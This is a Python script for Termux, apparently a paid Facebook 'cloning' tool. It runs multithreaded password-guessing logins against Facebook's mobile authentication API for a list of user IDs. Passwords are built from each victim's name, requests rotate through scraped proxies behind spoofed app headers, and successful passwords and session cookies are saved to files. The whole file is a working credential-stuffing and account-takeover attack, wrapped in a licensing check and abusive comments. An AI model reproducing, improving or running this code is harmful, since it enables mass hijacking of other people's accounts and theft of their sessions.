#Source By Awais
#Usman Tatta Copy Paster Ki Maa Ko Lund

#-----> Install Modules <-----#
import os
try: import pycurl
except: print(' \n ! Wait Please Installing Missing Modules...!');os.system('pip install -q pycurl')
# try: import fake_useragent
# except: os.system('pip -q install fake-useragent')
try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad
    from Crypto.Random import get_random_bytes
except: print(' \n ! Wait Please Installing Modules...!');os.system('pkg update -y && pkg upgrade -y');os.system('pkg install -y python clang libffi openssl');os.system('pip install pycryptodome')

#-----> Checking Latest File <-----#
os.system('echo -e "\e]0; E V I L \a"')
os.system('git pull -q')

#-----> Defines Modules -----#
import requests, random, string, uuid, json, marshal, zlib, sys, time, pycurl,gzip,subprocess,re,base64
from concurrent.futures import ThreadPoolExecutor as tred
from os import path
import shutil,hashlib
# from fake_useragent import settings
# from fake_useragent import UserAgent
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
from io import BytesIO

#-----> Open Wp Gp <-----#
os.system('xdg-open https://chat.whatsapp.com/Emq84DBJcQZKopFuFRJHs2')

#-----> Strg Permission Chk <-----#
def stg():
    try:
        open('/sdcard/XD.', 'a').write(' ')
    except:
        os.system('termux-setup-storage')
        stg()
stg()

#-----> Protection <-----#
if path.isfile("/data/data/com.termux/files/usr/bin/rm"):pass
else:print(" \033[91;1m! \033[97;1mTurn Off Protection...!");exit()

#-----> Colors <-----#
W = '\033[97;1m'
R = '\033[91;1m'
G = '\033[92;1m'
Y = '\033[93;1m'
B = '\033[94;1m'
P = '\033[95;1m'
S = '\033[96;1m'

#-----> Def Words <-----#
pas = []
cpp = []
coki = []
ok = []
cp = []
loop = 0

#-----> Folder <-----#
folder_path = '/sdcard/EVIL'
try:os.makedirs(folder_path, exist_ok=True)
except:pass

#-----> Requests Sys <-----#

#-----> Proxy <-----#
def fetch_proxies():
    try:
        g = requests.get('https://proxylist.geonode.com/api/proxy-list?limit=500&page=1&sort_by=lastChecked&sort_type=desc')
        proxies_data = g.json()
        proxies = proxies_data['data']
        with open('proxy.txt', 'w') as file:
            for proxy in proxies:
                proxy_ip = proxy['ip']
                proxy_port = proxy['port']
                proxy_url = f"http://{proxy_ip}:{proxy_port}"
                file.write(f"{proxy_url}\n")
        with open('proxy.txt', 'r') as file:
            saved_proxies = file.readlines()
        return saved_proxies
    except requests.exceptions.ConnectionError:
        sys.exit(f' {R}× {W}InterNet Contention Problem.!')
    except Exception as e:
        sys.exit(e)

saved_proxies = fetch_proxies()

#-----> Ua Def <-----#
def ua2():
    END = "[FBAN/Orca-Android;FBAV/20.0.0.38.32;FBBV/44314039;FBDM/{density=4.2,width=1440,height=2560};FBLC/it_CH;FBCR/3Austria;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.orca;FBDV/SM-G920R6;FBSV/7.0;nullFBCA/armeabi-v7a:armeabi;]"
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; Redmi Note 8 Pro Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)})[FBAN/FB4A;FBAV/45.0.0.{str(random.randint(1000,9000))};FBBV/{str(random.randint(100000,900000))};'+END
    return ua

def ua3():
    uu = "[FBAN/FB4A;FBAV/"+str(random.randint(11,99))+'.0.0.'+str(random.randrange(9,99))+'.'+str(random.randint(11,99)) +";FBBV/"+str(random.randint(1111111,9999999))+";"
    u = "[FBAN/FB4A;FBAV/25.0.0.60.43;FBBV/97828497;FBDM/{density=1.6,width=540,height=960};FBLC/ar_TD;FBCR/Good2GO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G5308W;FBSV/5.1.0;nullFBCA/armeabi-v7a:armeabi;]"
    return uu + u

#-----> Vers <-----#
Vers = "V7.5"

#-----> Logo <-----#
logo = f'''
{S}╔{W}═══════════════════════════{S}╦{W}════════{S}╗
{S}║{W} 888888 Yb    dP 88 88     {S}║{W}        {S}║
{S}║ {W}88__    Yb  dP  88 88    {S} ║{W}  {Y}Paid  {S}║
{S}║ {W}88""     YbdP   88 88  .o {S}║{W} {G} {Vers}  {S}║
{S}║ {W}888888    YP    88 88ood8 {S}║{W}        {S}║
{S}╠{W}═══════════════════════════{S}╩{W}════════{S}╣
{S}║      {W} Author :- {G}Usman Rajpoot  {S}    ║
{S}╚{W}════════════════════════════════════{S}╝'''

#-----> Def Clear + Logo <-----#
def clear():
    os.system('clear')
    print(logo)

#-----> Def Line <-----#
def line():
    print(f'{W}═'*38)

#-----> Approval SyS <-----#
TOKEN_FILE = "/s"+"dcard/And"+"roid/.evil_"+"key.json"
KEY_FILE = "/sdca"+"rd/An"+"droid/.ev"+"il_key"+".prof"

def generate_key():
    try:
        key = get_random_bytes(32)
        with open(KEY_FILE, 'wb') as kf:
            kf.write(key)
        return key
    except Exception as e:
        os.system(f"rm -rf {TOKEN_FILE} {KEY_FILE}")
        a_p()
        sys.exit()

def load_key():
    try:
        with open(KEY_FILE, 'rb') as kf:
            key = kf.read()
        return key
    except FileNotFoundError:
        return generate_key()

def encrypt_message(message, key):
    try:
        cipher = AES.new(key, AES.MODE_CBC)
        ct_bytes = cipher.encrypt(pad(message.encode(), AES.block_size))
        iv = base64.b64encode(cipher.iv).decode('utf-8')
        ct = base64.b64encode(ct_bytes).decode('utf-8')
        return iv + ct
    except Exception as e:
        os.system(f"rm -rf {TOKEN_FILE} {KEY_FILE}")
        a_p()
        sys.exit()

def decrypt_message(encrypted_message, key):
    try:
        iv = base64.b64decode(encrypted_message[:24])
        ct = base64.b64decode(encrypted_message[24:])
        cipher = AES.new(key, AES.MODE_CBC, iv)
        pt = unpad(cipher.decrypt(ct), AES.block_size)
        return pt.decode('utf-8')
    except Exception as e:
        os.system(f"rm -rf {TOKEN_FILE} {KEY_FILE}")
        a_p()
        sys.exit()

def a_p():
    key = load_key()

    try:
        with open(TOKEN_FILE, 'r') as f:
            encrypted_token = f.read()
        token_one = decrypt_message(encrypted_token, key)
    except FileNotFoundError:
        try:
            bsb = uuid.uuid1().hex[:7].upper()
            encrypted_bsb = encrypt_message(bsb, key)
            with open(TOKEN_FILE, 'w') as f:
                f.write(encrypted_bsb)
            a_p()
            return
        except Exception as e:
            a_p()
            sys.exit()
    except (KeyError, OSError, IOError) as e:
        print(f" {G}!{W} Allow Storage Permission...!")
        time.sleep(2)
        os.system('termux-setup-storage')
        a_p()
        return

    if token_one is None or len(token_one) != 7:
        os.system(f"rm -rf {TOKEN_FILE} {KEY_FILE}")
        a_p()
        return

    f_token = int(''.join(filter(str.isdigit, token_one)))
    f_tokenn = str(f_token * 86756555446775757566566655)
    main_tokn = bin(int.from_bytes(f_tokenn.encode(), byteorder='big'))

    try:
        clear()
        print(f'{G} !{Y} Wait Checking Your Approval...!')
        time.sleep(random.uniform(1.5, 3.0))
        xdi = ''.join(['h','t','t','p','s',':','/','/','u','s','m','a','n','-','x','d','.','b','l','o','g','s','p','o','t','.','c','o','m','/','2','0','2','4','/','0','6','/','d','i','g','i','t','a','l','-','s','e','c','u','r','i','t','y','-','i','n','s','u','r','a','n','c','e','.','h','t','m','l','?','m','=','1'])
        gndu = usman(xdi)
        if main_tokn in gndu:
            line()
            print(f'{G} ✓ {W}Your Key Approved...!')
            time.sleep(2)
            pass
        else:
            _uuid = f'{str(os.geteuid())}98557'
            iid = "0".join(_uuid)
            intu = int(iid.split("#")[0])
            _id = str((intu + 523217) % 109 * 7678888 * 66566 + 767 )
            _help = _id
            line()
            print(f'{R} ! {W}Your Key Not Approved...!')
            time.sleep(2)
            clear()
            print(f'{G} • {W}This Tool Is Paid')
            line()
            print(f'{G} • {W}Your Key :- {Y}{f_token}Z{_help}')
            line()
            input(f'{G} • {W}Press Enter To Buy Tool')
            os.system(f'xdg-open https://wa.me/+923187061605?text=*HELLO*%2C%20*SIR*%20*I*%20*WANT*%20*TO*%20*YOUR*%20*EVIL*%20*TOOL*%20*PAID*%20*APPROVAL*%20/%20%20*My*%20*Key*%20*:*%20{f_token}Z{_help}')
            sys.exit()
    except requests.exceptions.ConnectionError:
        print(f'{R} × {W}Your Internet Connection Lol..!')
        sys.exit()
    except Exception as e:
        print(e)

#-----> Main Menu <-----#
def menu():
    a_p()
    clear()
    print(f'{W} (1) File Cloning \n (2) Random Cloning \n (3) Join Wp Group \n (4) {Y}Contact Admin \n {R}(0) Exit Tool ')
    line()
    xd = input(f'{G} ? {W}Enter OpT :-{G} ')
    if xd=='1':
        filee()
    elif xd=='2':
        line()
        print(f'{G} × {W}Random Not Working...!')
        time.sleep(2)
        menu()
        pk()
    elif xd=='3':
        os.system('xdg-open https://chat.whatsapp.com/Emq84DBJcQZKopFuFRJHs2')
        menu()
    elif xd=='4':
        os.system('xdg-open https://wa.me/+923187061605')
        menu()
    elif xd=='0':
        line()
        print(f'{G} ✓ {W}Ok Bye')
        line(); sys.exit()
    else:
        line()
        print(f'{R} × {W}Entered Wrong OpT..!')
        time.sleep(1.5);menu()

#-----> File <-----#
def filee():
    clear()
    print(f'{G} •{W} File Path Ex :- /sdcard/file.txt')
    line()
    try:
        fil = input(f'{G} ?{W} Enter File Path :- {G}')
        with open(fil, 'r') as file:
            fill = file.read().splitlines()
    except FileNotFoundError:
        line()
        print(f'{R} ×{W} Not Found File..!')
        time.sleep(1.5)
        menu()
    clear()
    try:
        lim = int(input(f'{G} ?{W} Enter Password Limits :- {G}'))
    except ValueError:
        lim = 2
    line()
    for i in range(lim):
        pas.append(input(f'{G} {i+1} {W}Enter Password :- {G}'))
    clear()
    cp_op = input(f'{G} ?{W} Do You Show CP Accounts (y/n) :- {G}')
    if cp_op in ['y','Y']:cpp.append('y')
    else:cpp.append('n')
    clear()
    print(f'{W} (1) Method ({G}New Series{W})')
    print(f'{W} (2) Method ({G}Mix Series{W})')
    print(f'{W} (3) Method ({G}New+Old{W}) ')
    line()
    xdd = input(f'{G} ? {W}Enter OpT :-{G} ')
    with tred(max_workers=35) as evil:
        clear()
        fil_lim = str(len(fill))
        print(f'{G} • {W}ToTal iDs :- {G}{fil_lim}')
        print(f'{G} ✓ {W}Your Process Has Been Started')
        print(f'{G} • {R}If Loop Color Red Then Ur ip Block')
        line()
        for splt in fill:
            try:
                ids,name = splt.split('|')
                pasw = pas
                if xdd in ('1','01'):
                    evil.submit(m1,ids,name,pasw)
                elif xdd in ('2','02'):
                    evil.submit(m2,ids,name,pasw)
                elif xdd in ('3','03'):
                    evil.submit(m3,ids,name,pasw)
                else:
                    evil.submit(m1,ids,name,pasw)
            except:continue
    print('')
    line()
    print(f'{G} ✓ {W}Your Process Has Been Completed..!')
    line()
    input(f'{G} • {Y}Press Any Key')
    menu()

#-----> Method 1 <-----#
def m1(ids, name, pasw):
        try:
                global ok, cp, loop,cpp
                sys.stdout.write(f'\r\r {W}M1 {S}- {W}{loop}|{G}{len(ok)}{W}|{Y}{len(cp)}{W}')
                sys.stdout.flush()
                fp = name.split(' ')[0]
                lp = name.split(' ')[1] if len(name.split(' ')) > 1 else fp
                for ps in pasw:
                    pas = ps.replace('first', fp.lower()).replace('First', fp).replace('last', lp.lower()).replace('Last', lp).replace('Name', name).replace('name', name.lower())
                    adid = str(uuid.uuid4())
                    uaa = ua2()
                    proxy_u = random.choice(saved_proxies).strip()
                    proxies = {'http':f'{proxy_u}'}
                    data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
                    headers = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": uaa,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
                    url = 'https://b-graph.facebook.com/auth/login'
                    po = requests.post(url,data=data,headers=headers, proxies=proxies).json()
                    if 'session_key' in po:
                        ok.append(ids)
                        coki = ";".join(i["name"] + "=" + i["value"] for i in po["session_cookies"])
                        print(f'\r\r{G} [OK] {ids} ✓ {pas} ')
                        open('/sdcard/EVIL/EVIL-ok-ids.txt', 'a').write(ids + '|' + pas + '|' + coki + '\n')
                        break
                    elif 'Login approvals' in str(po):
                        print(f'\r\r{B} [2F] {ids} • {pas} ')
                        break
                    elif 'The action attempted has been deemed abusive' in po.get('error', {}).get('message', ''):
                        sys.stdout.write(f'\r\r{R} {loop}|{len(ok)}|{len(cp)}{W}')
                        sys.stdout.flush()
                    elif 'www.facebook.com' in po.get('error', {}).get('message', ''):
                        cp.append(ids)
                        if 'y' in cpp:
                            print(f'\r\r{Y} [CP] {ids} • {pas} ')
                        open('/sdcard/EVIL/EVIL-cp-ids.txt', 'a').write(ids + '|' + pas + '\n')
                        break
                    else:
                        continue
                loop += 1
        except requests.exceptions.ConnectionError:
            time.sleep(25)
        except Exception as e:
            pass

#-----> Method 1 <-----#
def m2(ids, name, pasw):
        try:
                global ok, cp, loop,cpp
                sys.stdout.write(f'\r\r {W}M2 {S}- {W}{loop}|{G}{len(ok)}{W}|{Y}{len(cp)}{W}')
                sys.stdout.flush()
                fp = name.split(' ')[0]
                lp = name.split(' ')[1] if len(name.split(' ')) > 1 else fp
                for ps in pasw:
                    pas = ps.replace('first', fp.lower()).replace('First', fp).replace('last', lp.lower()).replace('Last', lp).replace('Name', name).replace('name', name.lower())
                    adid = str(uuid.uuid4())
                    uaa = ua2()
                    proxy_u = random.choice(saved_proxies).strip()
                    proxies = {'http':f'{proxy_u}'}
                    data = {"adid": adid,"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email": ids,"password": pas,"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies": "1","meta_inf_fbmeta": "","advertiser_id": "8b59ed89-4b88-4f69-a1ed-dfea59e76839","currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d",}
                    headers={'User-Agent': uaa,'Content-Type': 'application/x-www-form-urlencoded','Host': 'graph.facebook.com','X-FB-Net-HNI': '25227','X-FB-SIM-HNI': '29752','X-FB-Connection-Type': 'MOBILE.LTE','X-Tigon-Is-Retry': 'False','x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62','x-fb-device-group': '5120','X-FB-Friendly-Name': 'ViewerReactionsMutation','X-FB-Request-Analytics-Tags': 'graphservice','X-FB-HTTP-Engine': 'Liger','X-FB-Client-IP': 'True','X-FB-Server-Cluster': 'True','x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62','Content-Length': '706'}
                    url = 'https://b-graph.facebook.com/auth/login'
                    po = requests.post(url,data=data, proxies=proxies,headers=headers).json()
                    if 'session_key' in po:
                            ok.append(ids)
                            coki = ";".join(i["name"] + "=" + i["value"] for i in po["session_cookies"])
                            print(f'\r\r{G} [OK] {ids} ✓ {pas} ')
                            open('/sdcard/EVIL/EVIL-ok-ids.txt', 'a').write(ids + '|' + pas + '|' + coki + '\n')
                            break
                    elif 'Login approvals' in str(po):
                            print(f'\r\r{B} [2F] {ids} • {pas} ')
                            break
                    elif 'The action attempted has been deemed abusive' in po.get('error', {}).get('message', ''):
                        sys.stdout.write(f'\r\r{R} {loop}|{len(ok)}|{len(cp)}{W}')
                        sys.stdout.flush()
                    elif 'www.facebook.com' in po.get('error', {}).get('message', ''):
                            cp.append(ids)
                            if 'y' in cpp:
                                print(f'\r\r{Y} [CP] {ids} • {pas} ')
                            open('/sdcard/EVIL/EVIL-cp-ids.txt', 'a').write(ids + '|' + pas + '\n')
                            break
                    else:
                            continue
                loop += 1
        except requests.exceptions.ConnectionError:
            time.sleep(23)
        except Exception as e:
            pass

#-----> Method 3 <-----#
def m3(ids, name, pasw):
        try:
                global ok, cp, loop,cpp
                sys.stdout.write(f'\r\r {W}M3 {S}- {W}{loop}|{G}{len(ok)}{W}|{Y}{len(cp)}{W}')
                sys.stdout.flush()
                fp = name.split(' ')[0]
                lp = name.split(' ')[1] if len(name.split(' ')) > 1 else fp
                for ps in pasw:
                    pas = ps.replace('first', fp.lower()).replace('First', fp).replace('last', lp.lower()).replace('Last', lp).replace('Name', name).replace('name', name.lower())
                    random_seed = random.Random()
                    proxy_u = random.choice(saved_proxies).strip()
                    proxies = {'http':f'{proxy_u}'}
                    adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                    accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                    xd =str(''.join(random_seed.choices(string.digits, k=20)))
                    sim_serials = f'["{xd}"]'
                    uaa = ua3()
                    data ={
                            'adid':adid,
                            'format':'json',
                            'device_id':str(uuid.uuid4()),
                            'email':ids,
                            'password':pas,
                            'generate_analytics_claims':'1',
                            'community_id':'',
                            'cpl':'true',
                            'try_num':'1',
                            'family_device_id':str(uuid.uuid4()),
                            'sim_serials':sim_serials,
                            'credentials_type':'password',
                            'source':'login',
                            'error_detail_type':'button_with_disabled',
                            'enroll_misauth':'false',
                            'generate_session_cookies':'1',
                            'generate_machine_id':'1',
                            'meta_inf_fbmeta':'',
                            'currently_logged_in_userid':'0',
                            'locale':'en_US',
                            'client_country_code':'US',
                            'fb_api_req_friendly_name':'authenticate',
                    }
                    headers={
                            'Authorization':f'OAuth {accessToken}',
                            'X-FB-Friendly-Name':'authenticate',
                            'X-FB-Connection-Bandwidth':str(random.randint(2e7,3e7)),
                            'X-FB-Net-HNI': str(random.randint(11111, 99999)),
                            'X-FB-SIM-HNI': str(random.randint(11111, 99999)),
                            'X-FB-Connection-Type':'unknown',
                            'User-Agent':uaa,
                            'Accept-Encoding':'gzip, deflate',
                            'Content-Type': 'application/x-www-form-urlencoded',
                            'X-FB-HTTP-Engine': 'Liger'
                            }
                            
                    url = 'https://b-api.facebook.com/method/auth.login'
                    po = requests.post(url,data=data,proxies=proxies,headers=headers).json()
                    if 'session_key' in po:
                        ok.append(ids)
                        coki = ";".join(i["name"] + "=" + i["value"] for i in po["session_cookies"])
                        print(f'\r\r{G} [OK] {ids} ✓ {pas} ')
                        open('/sdcard/EVIL/EVIL-ok-ids.txt', 'a').write(ids + '|' + pas + '|' + coki + '\n')
                        break
                    elif 'Login approvals' in str(po):
                        print(f'\r\r{B} [2F] {ids} • {pas} ')
                        break
                    elif 'The action attempted has been deemed abusive' in po.get('error', {}).get('message', ''):
                        sys.stdout.write(f'\r\r{R} {loop}|{len(ok)}|{len(cp)}{W}')
                        sys.stdout.flush()
                    elif 'www.facebook.com' in po['error_msg']:
                        cp.append(ids)
                        if 'y' in cpp:
                            print(f'\r\r{Y} [CP] {ids} • {pas} ')
                        open('/sdcard/EVIL/EVIL-cp-ids.txt', 'a').write(ids + '|' + pas + '\n')
                        break
                    else:
                        continue
                loop += 1
        except requests.exceptions.ConnectionError:
            time.sleep(25)
        except Exception as e:
            pass

#-----> Checking Menu <-----#
try: stg();menu()
except requests.exceptions.ConnectionError: sys.exit(f' {R}× {W}InterNet Contention Problem.!')
except Exception as e: sys.exit(e)
